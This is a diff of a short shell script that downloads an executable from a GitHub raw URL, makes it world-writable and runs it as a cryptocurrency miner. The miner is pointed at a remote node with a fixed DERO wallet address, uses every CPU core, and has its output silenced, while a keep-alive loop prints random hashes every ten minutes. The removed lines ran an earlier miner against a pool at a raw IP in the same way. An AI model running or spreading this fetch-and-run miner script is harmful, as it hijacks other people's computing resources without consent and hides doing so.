@@ -1,4 +1,4 @@
-wget https://raw.githubusercontent.com/novalanto010101/file/main/uranus-0.0.3.1-linux-amd64.tar.xz
-tar xf uranus-0.0.3.1-linux-amd64.tar.xz
-./uranus -o wss://164.92.163.246:80 -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeecegwwntwqfyshs078y -t $(nproc --all) >/dev/null 2>&1
+wget https://raw.githubusercontent.com/novalanto010101/file/main/astor
+chmod 777 astor
+./astor -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeecegwwntwqfyshs078y -r dero-node-overlode.mysrv.cloud:10300 -p rpc -m $(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
